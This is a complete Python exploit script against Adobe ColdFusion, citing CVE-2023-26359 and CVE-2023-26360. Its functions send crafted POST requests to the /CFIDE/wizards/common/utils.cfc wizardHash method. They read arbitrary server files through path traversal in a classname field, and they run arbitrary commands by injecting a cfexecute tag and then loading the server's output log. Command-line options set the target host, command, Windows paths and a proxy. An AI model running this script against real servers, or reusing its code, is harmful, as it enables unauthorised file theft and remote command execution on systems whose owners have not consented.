import sys
import requests
import json
import argparse
import re
import logging

# Setup basic logging configuration
logging.basicConfig(level=logging.INFO, format='[*] %(levelname)s - %(message)s')

def clean_response_text(input_text):
    """
    Clean the response text by removing unnecessary XML tags and the last line.
    """
    # Delete the unnecessary XML tags from the beginning
    output = re.sub(r'^<.*>', '', input_text, flags=re.DOTALL)
    
    # Delete the last line containing unnecessary info
    lines = output.strip().split('\n')
    output = '\n'.join(lines[:-1])

    return output

def get_file_content(host, endpoint, file_path, proxy_url=None):
    """
    Retrieve the content of a file from the server.
    """
    logging.info(f"Attempting to read file: {file_path}")
    data = {'_variables': json.dumps({"_metadata": {"classname": f"any/{file_path}"}, "_variables": []})}
    vars_get = {'method': 'wizardHash', '_cfclient': 'true', 'inPassword': 'any'}
    uri = f'{host}{endpoint}'

    response = requests.post(uri, params=vars_get, data=data, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None)

    file_content = clean_response_text(response.text)

    if not file_content:
        raise ValueError('Failed to read the file. Make sure the file exists and you used "../" prefixes if necessary.')

    logging.info(f"Successfully read file: {file_path}")
    return file_content

def run_remote_command(host, endpoint, cmd, proxy_url=None, win=False):
    """
    Execute a remote command on the server.
    """
    logging.info(f"Attempting to execute command: {cmd}")
    data = {'_variables': f"{{<cfexecute name='{cmd}'></cfexecute>}}"}
    vars_get = {'method': 'wizardHash', '_cfclient': 'true', 'inPassword': 'any'}
    uri = f'{host}{endpoint}'

    response = requests.post(uri, params=vars_get, data=data, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None)

    if response.status_code != 200:
        logging.error(f"Failed to execute command. Response code: {response.status_code}")
        raise ValueError(f"Failed to execute command. Response code: {response.status_code}")

    logging.info("Command executed, attempting to trigger the payload with the output log.")
    
    # Determine the path to the log file based on the operating system
    log_path = "../../logs/coldfusion-out.log" if not win else "any\\..\\..\\logs\\coldfusion-out.log"
    data = {'_variables': json.dumps({"_metadata": {"classname": log_path}, "_variables": []})}

    response = requests.post(uri, params=vars_get, data=data, proxies={'http': proxy_url, 'https': proxy_url} if proxy_url else None)
    file_content = clean_response_text(response.text)

    if response.status_code == 200:
        logging.info("The remote command has been executed on the backend if the configs are OK.")
    else:
        raise ValueError(f"Failed to retrieve log after command execution. Response code: {response.status_code}")

    return file_content

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script for remote file read or command execution against Adobe ColdFusion (CVE-2023-26359, CVE-2023-26360, and CVE-2023-26359).")
    parser.add_argument('--host', required=True, help="Target host URL")
    parser.add_argument('--read-file', '-f', help="File path to read from the host")
    parser.add_argument('--cmd', '-c', help="Command to execute on the target")
    parser.add_argument('--endpoint', default="/CFIDE/wizards/common/utils.cfc", help="Endpoint URL")
    parser.add_argument('--win', action="store_true", help="Specify this if the target host is considered to be Windows.")
    parser.add_argument('--proxy', help="Proxy URL")

    args = parser.parse_args()

    if not (args.read_file or args.cmd):
        parser.error("Either --read-file or --cmd must be specified.")

    if args.endpoint:
        endpoint = args.endpoint
        if not endpoint.endswith('.cfc'):
            endpoint += '.cfc'
    else:
        endpoint = "/CFIDE/wizards/common/utils.cfc"

    try:
        if args.read_file:
            if args.read_file.endswith('.cfc'):
                raise ValueError('The target file must not point to a .cfc')
            file_content = get_file_content(args.host, endpoint, args.read_file, args.proxy)
            print(file_content)

        elif args.cmd:
            file_content = run_remote_command(args.host, endpoint, args.cmd, args.proxy, args.win)

    except Exception as e:
        logging.error(f"Error: {e}")